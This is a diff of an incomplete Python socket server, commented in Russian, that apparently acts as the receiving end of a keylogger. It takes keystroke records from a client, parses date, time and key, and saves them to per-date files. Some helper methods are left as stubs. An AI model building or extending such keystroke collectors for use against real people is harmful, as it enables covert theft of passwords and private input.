@@ -2,6 +2,8 @@ import socket
 import os
 import sys
 
+from typing import List, Optional, Tuple
+
 
 '''
 РАБОТА СЕРВЕРА
@@ -43,45 +45,52 @@ class Server:
     def serve_client(self, conn: socket.socket) -> None:         
         # сохранение данных в папку data
         try:
-            self.__save_data(self.__get_data(conn))
+            data = self.__get_data(conn)
+            self.__save_data(data)
         except Exception as ex:
             raise Exception(f"{ex}")
 
 
-    def __save_data(self, data: list[str]) -> None: 
+    def __save_data(self, data: List[str]) -> None: 
         # создание папки data, если ее не существует
         if not os.path.exists(self._path_to_data_dir):
             os.makedirs(self._path_to_data_dir)
-       
+
         # проходимся по каждой записи нажатия клавиш в истории нажатий
         for i, record in enumerate(data):
             # получаем дату, время и ключ (название нажатой клавиши)
             try:
-                date, time, key = record.split(":")
-            except: continue   
-
-            print(f"{i+1}. {date} : {time} - {key}")     
+                date, time, key = record.split("`")
+            except Exception as ex:
+                print(f"__save_data() failed. ex: {ex}") 
+                continue
+                   
+            print(f"[+] {i+1}. GET FROM CLIENT: {date}; {time}; key: {key}. Status: ", end="")     
             
             # список всех файлов в папке data
             files: list[str] = os.listdir(self._path_to_data_dir)
             
             # проверяем есть ли файл с текущей датой в папке data
-            if filepath := os.path.join(self._path_to_data_dir, date+".txt") not in files:
+            if (filepath := os.path.join(self._path_to_data_dir, date+".txt")) not in files:
                 self.__create_file(filepath)
+                print(filepath)
             
             # добавление записи в файл
-            self.__add_to_file(filepath, record)
-
+            try:
+                self.__add_to_file(filepath, record)
+            except Exception as ex: print("FAILED...")
+            else: print("SAVED!")
     
-    def __create_file(self, filepath: str, content: str) -> None:
+
+    def __create_file(self, filepath: str, content: Optional[str] = None) -> None:
         ...
 
 
-    def __add_to_file(filepath: str, record: str) -> None:
+    def __add_to_file(self, filepath: str, record: str) -> None:
         ...
              
 
-    def __get_data(self, conn: socket.socket) -> tuple[str]: 
+    def __get_data(self, conn: socket.socket) -> Tuple[str]: 
         try:
             buffer: bytes = conn.recv(1024)
             data: str = buffer.decode()
